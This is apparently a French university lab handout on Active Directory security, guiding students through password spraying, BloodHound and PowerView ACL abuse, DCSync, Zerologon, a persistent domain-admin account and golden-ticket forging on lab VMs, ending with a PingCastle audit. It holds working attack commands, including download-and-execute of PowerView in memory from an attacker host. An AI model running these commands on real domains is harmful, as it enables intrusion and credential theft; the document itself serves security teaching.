# Sécurité de l'Active Directory - TP 2

**Objectif :** Exploitation avancée d'ACLs et escalade de privilèges

> ⚠️ **Consignes importantes** : Réalisez un compte rendu de toutes les étapes de manière à ce que vous puissiez le reprendre plus tard quand vous en avez besoin, et répondez aux questions (identifiées par ❓). Pensez à prendre des captures d'écran de vos manipulations !

## 1. Prérequis et Scan

- **Kali Linux** : allouez idéalement 3 GB de RAM (sinon 2 GB suffiront, mais hashcat pourrait refuser de se lancer). La Kali doit avoir deux interfaces réseau : NAT (Internet) et Réseau privé hôte. Pensez à faire un `apt update`.
- **VMs Cibles** : Windows Server 2012 et Tiny10. Les machines virtuelles doivent être configurées en "Réseau privé hôte".

Lancez les 2 machines virtuelles et vérifiez leurs adresses IP. Utilisez la commande ci-dessous pour identifier l'adresse IP des VMs Windows :

```bash
nbtscan 192.168.56.0/24
```

> 💡 **Outil** : Téléchargez l'outil `go-windapsearch` comme sur le premier TP. Ne cherchez pas à le compiler, téléchargez directement l'exécutable depuis les releases GitHub.

## 2. Password Spraying et Énumération

Utilisez `go-windapsearch` pour faire une requête LDAP (`objectClass=domainDNS`) et observez les attributs suivants :

- `lockoutDuration`
- `lockoutThreshold`
- `lockoutObservationWindow`

> ❓ **Question 2.1** : Interprétez et expliquez la fonction de ces attributs de sécurité.

Récupérez la liste des utilisateurs de manière complète :

```bash
./windapsearch-linux-amd64 --dc <DOMAIN_IP> -m users --full
```

Faites un `grep` sur "description", et repérez les descriptions qui commencent par *"New user generated password"*. Faites un script ou un one-liner pour :

1. Extraire le `sAMAccountName` de chaque utilisateur et l'enregistrer dans un fichier `users.txt`.
2. Extraire le champ `description` de chaque utilisateur et l'enregistrer dans un fichier `passwords.txt`.

Une fois votre wordlist prête, téléchargez `kerbrute` et exécutez-le pour énumérer les utilisateurs :

```bash
./kerbrute_linux_amd64 userenum -d <DOMAIN> usernames.txt
```

Testez ensuite l'un des mots de passe :

```bash
./kerbrute_linux_amd64 passwordspray -d <DOMAIN> --dc <DOMAIN_IP> usernames.txt '<PASSWORD>'
```

> ℹ️ **Note** : Les comptes qui ont leurs mots de passe expirés affichent "VALID LOGIN" avec n'importe quel mot de passe.

Exécutez la commande suivante :

```bash
nxc ldap <DC_IP> -u '' -p '' -M get-desc-users
```

> ❓ **Question 2.2** : Que fait précisément cette commande ?

## 3. Force Brute et Variations de Mots de Passe

Repérez les comptes qui ont la description *Company default password(Reset ASAP)* et relevez leurs noms d'utilisateurs dans une wordlist dédiée. Créez un fichier de liste de mots de passe potentiels à partir du nom de domaine (sans le `.local`) avec hashcat. Dans un fichier `potential.txt`, insérez le ou les mots de passe de base :

```bash
echo "<POTENTIAL_WORD>" >> potential.txt
```

Exécutez la commande suivante :

```bash
hashcat -a 6 potential.txt ?d?d?d --force --stdout > default_password.txt
```

> ❓ **Question 3.1** : Que fait la dernière commande ? À quoi correspond la chaîne `?d?d?d` ?

Créez un fichier `combo.txt` avec les noms d'utilisateurs concernés et les mots de passe générés par hashcat. Exécutez :

```bash
./kerbrute_linux_amd64 bruteforce combo.txt -d <DOMAIN> --dc <DC_IP>
```

Vous devriez avoir trouvé un mot de passe `epitaXXX`. Relancez un password spraying avec `nxc`. N'oubliez pas d'initialiser nxcdb :

```bash
nxcdb
proto smb
creds
nxc <protocole> <IP> -u <USER_WORDLIST> -p <PASS_WORDLIST> --continue-on-success
```

> ⚠️ **Problème** : Les utilisateurs doivent changer le mot de passe (`STATUS_PASSWORD_MUST_CHANGE`), et cela n'est pas enregistré dans la base de données.

### Changement de mot de passe

Vous pouvez changer le mot de passe à distance avec la commande (en respectant la complexité) :

```bash
impacket-changepasswd <DOMAIN>/<USER>:'<PASSWORD>'@<DOMAIN_IP> -newpass
```

> 🛠️ **Action requise** : Faites un script pour changer le mot de passe de tous les comptes affectés par un mot de passe qui respecte la complexité. Relancez `nxc` une fois terminé.

## 4. Accès RDP et Collecte BloodHound

Trouvez les utilisateurs appartenant au groupe "Utilisateurs du Bureau à distance" :

```bash
nxc ldap <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --groups "Utilisateurs du Bureau a distance"
```

Vérifiez l'accès RDP avec une capture d'écran via NetExec :

```bash
nxc rdp <IP_POSTE_CLIENT> -u <USERNAME> -p '<PASSWORD>' --screenshot
```

Connectez-vous en bureau à distance :

```bash
xfreerdp /u:<USERNAME> /p:'<PASSWORD>' /v:<PC_IP> /size:1920x1080
```

Transférez `SharpHound.exe` sur le poste de travail via un serveur web Python (`python -m http.server`). Depuis PowerShell sur le poste client :

```powershell
iwr http://<KALI_IP>:8000/SharpHound.exe -O SharpHound.exe
.\SharpHound.exe -c All
```

> ❓ **Question 4.1** : Que fait la commande `.\SharpHound.exe -c All` ?

Alternative depuis Kali si nécessaire :

```bash
bloodhound-python -d <DOMAIN> -ns <DC_IP> --dns-tcp --dns-timeout 10 -no-pass -u '<USERNAME>' -p '<PASSWORD>' --zip -c all
```

Rapatriez le ZIP via un partage SMB Impacket (`impacket-smbserver`) depuis le poste client.

## 5. Analyse BloodHound et PowerView

> ⚠️ **Objectif** : On va exploiter un chemin d'attaque qui part de l'utilisateur `ALYSA.ARETHA`. Son mot de passe est dans sa description, mais il doit être changé via `impacket-smbpasswd` ou `impacket-changepasswd`.

Cherchez l'utilisateur `ALYSA.ARETHA` dans BloodHound. Observez les onglets : First Degree Object Control, Group Delegated Object Control, Transitive Object Control.

> ❓ **Question 5.1** : Comparez ces résultats et expliquez à quoi ils correspondent dans BloodHound.

Faites un clic droit sur le lien **"GenericAll"** entre ALYSA.ARETHA et STELLA.ARABELE, puis cliquez sur "Help".

> ❓ **Question 5.2** : Consultez l'onglet "Windows Abuse" et expliquez ce qui y est indiqué.

Changez le mot de passe de STELLA.ARABELE via PowerShell (en étant connecté en tant qu'ALYSA.ARETHA) :

```powershell
net user STELLA.ARABELE <PASSWORD> /domain
```

Testez l'accès :

```bash
nxc smb <DC_IP> -u STELLA.ARABELE -p <PASSWORD>
```

### Utilisation de PowerView

Téléchargez et exécutez PowerView.ps1 :

```powershell
iwr http://<KALI_IP>:8000/PowerView.ps1 -O PowerView.ps1
```

> ❓ **Question 5.3** : Pourquoi l'exécution d'un script non signé ne fonctionne-t-elle pas par défaut ?

Passez outre la politique d'exécution :

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
```

> ❓ **Question 5.4** : Expliquez l'impact de cette commande.

Fermez et rouvrez PowerShell, puis exécutez la méthode "in-memory" :

```powershell
iwr http://<KALI_IP>:8000/PowerView.ps1 | iex
```

> ❓ **Question 5.5** : Que fait cette commande (`| iex`) et en quoi est-ce utile lors d'un test d'intrusion ?

Analysez les ACLs avec PowerView :

```powershell
Find-InterestingDomainAcl | ? {$_.ActiveDirectoryRights -eq "GenericAll" -and $_.IdentityReferenceName -eq "alysa.aretha"}
```

> ❓ **Question 5.6** : Que fait précisément cette recherche ?

## 6. AD Miner et Graphes

Installez l'outil AD Miner pour une vision complémentaire :

```bash
pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
pipx ensurepath
AD-miner -cf My_Report -u neo4j -p <PASSWORD>
```

> 💡 **Action** : Consultez `index.html`. Cliquez sur "Path to Domain Admins". Identifiez le chemin vers l'admin du domaine et comparez ces graphes avec la requête "Shortest Paths to Unconstrained Delegation Systems" de BloodHound.

## 7. Exploitation des ACLs (Escalade)

### Étape A : STELLA.ARABELE → IT HELPDESK (GenericAll)

Créez un objet credential en PowerShell :

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
```

Ajoutez-vous au groupe :

```powershell
Add-DomainGroupMember -Identity 'IT Helpdesk' -Members '<USERNAME>' -Credential $Cred
Get-DomainGroupMember -Identity 'IT Helpdesk'
```

> ❓ **Question 7.1** : Expliquez ces commandes PowerView.

### Étape B : IT HELPDESK → DOMINICA.DATHA (WriteOwner)

Attribuez-vous la propriété de l'utilisateur :

```powershell
Set-DomainObjectOwner -Credential $Cred -Identity "DOMINICA.DATHA" -OwnerIdentity "STELLA.ARABELE"
```

Créez une ACL GenericAll pour vous-même sur la cible :

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity DOMINICA.DATHA -Rights All -PrincipalIdentity STELLA.ARABELE
```

Changez le mot de passe de la cible via votre nouveau droit :

```powershell
$UserPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity DOMINICA.DATHA -Credential $Cred -AccountPassword $UserPassword
```

## 8. DCSync et Zerologon

Utilisez Impacket avec la cible compromise :

> ❓ **Question 8.1** : Utilisez `impacket-secretsdump` avec les identifiants de DOMINICA.DATHA. Expliquez les arguments et le résultat.

Connectez-vous au DC avec `impacket-psexec` ou `evil-winrm`. Utilisez PowerView via l'implémentation Python depuis Kali :

```bash
powerview <DOMAIN>/<USERNAME>@<DC_IP> -H ":<HASH>"
```

Création d'un "super admin" :

```powershell
Add-domainuser -UserName superadmin -UserPass 'Toto89100!'
Add-DomainGroupMember -Identity "Admins du domaine" -Members superadmin
Add-DomainGroupMember -Identity "Utilisateurs du bureau a distance" -Members superadmin
```

> ❓ **Question 8.2** : Détaillez l'action de ces commandes de persistance.

### Zerologon (CVE-2020-1472)

Utilisez l'exploit sur le DC :

```bash
python set_empty_pw.py DC <DC_IP>
```

> ❓ **Question 8.3** : Expliquez la vulnérabilité Zerologon et le but de ce script.

Si succès, lancez le DCSync de la machine :

```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '<DOMAIN>/<COMPTE_MACHINE$>@<DC_IP>'
```

> ❓ **Question 8.4** : Quel compte est utilisé ici et pourquoi le hash NTLM est-il `31d6cfe0d16ae931b73c59d7e0c089c0` ?

## 9. Bonus : Post-Exploitation et Golden Ticket

> ❓ **Question 9.1** : Réalisez un DCSync global. Combien de mots de passe avez-vous pu récupérer, et comment en obtenir d'autres ?

### Forgeage d'un Golden Ticket

```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> <USERNAME_FICTIF> -domain <DOMAIN>
export KRB5CCNAME=<USERNAME_FICTIF>.ccache
impacket-secretsdump <DOMAIN>/<USERNAME_FICTIF>@DC.epita.local -k -no-pass -dc-ip <DC_IP>
```

## 10. Audit de configuration avec PingCastle

Lancez PingCastle avec l'option Healthcheck sur le domaine racine. Analysez le rapport HTML :

- Quel est le score global ?
- Analysez les non-conformités et faites le parallèle avec vos attaques. Qu'est-ce qui est corrigeable facilement ?
- Section "Trusts" : la relation Parent-Enfant est-elle sécurisée ?
- Trouvez les comptes vulnérables (Kerberoasting, description en clair).
- Vérifiez la politique de mots de passe.

### Exploration des ACLs

Exploitez les arêtes restantes vues dans le graphe : `ForceChangePassword`, `SelfAdd`, `WriteDACL`.

---

*Document réalisé dans le cadre de la préparation à la certification eJPT — basé sur le TP "Sécurité de l'Active Directory - TP 2".*
